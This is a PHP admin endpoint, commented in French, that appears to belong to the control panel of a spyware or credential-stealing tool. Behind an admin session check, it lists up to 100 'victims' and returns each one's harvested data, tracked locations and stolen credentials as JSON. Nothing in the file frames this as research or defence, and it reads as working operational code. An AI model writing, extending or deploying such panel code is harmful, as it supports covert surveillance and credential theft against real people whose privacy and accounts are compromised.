<?php
session_start();
require_once '../config.php';

// Vérification session admin
if (!isset($_SESSION['admin'])) {
    http_response_code(401);
    die(json_encode(['error' => 'Unauthorized']));
}

$id = $_GET['id'] ?? '';

if (!$id) {
    // Liste toutes les victimes
    $stmt = $pdo->query("
        SELECT v.*, 
               (SELECT COUNT(*) FROM data WHERE victim_id=v.id) as data_count,
               (SELECT COUNT(*) FROM locations WHERE victim_id=v.id) as location_count,
               (SELECT COUNT(*) FROM credentials WHERE victim_id=v.id) as credentials_count
        FROM victims v
        ORDER BY v.last_seen DESC
        LIMIT 100
    ");
    $victims = $stmt->fetchAll();
    
    echo json_encode($victims);
    
} else {
    // Détails d'une victime
    $stmt = $pdo->prepare("SELECT * FROM victims WHERE id = ?");
    $stmt->execute([$id]);
    $victim = $stmt->fetch();
    
    if (!$victim) {
        http_response_code(404);
        die(json_encode(['error' => 'Victim not found']));
    }
    
    // Données associées
    $stmt = $pdo->prepare("SELECT * FROM data WHERE victim_id = ? ORDER BY timestamp DESC");
    $stmt->execute([$id]);
    $victim['data'] = $stmt->fetchAll();
    
    $stmt = $pdo->prepare("SELECT * FROM locations WHERE victim_id = ? ORDER BY timestamp DESC");
    $stmt->execute([$id]);
    $victim['locations'] = $stmt->fetchAll();
    
    $stmt = $pdo->prepare("SELECT * FROM credentials WHERE victim_id = ? ORDER BY timestamp DESC");
    $stmt->execute([$id]);
    $victim['credentials'] = $stmt->fetchAll();
    
    echo json_encode($victim);
}
?>
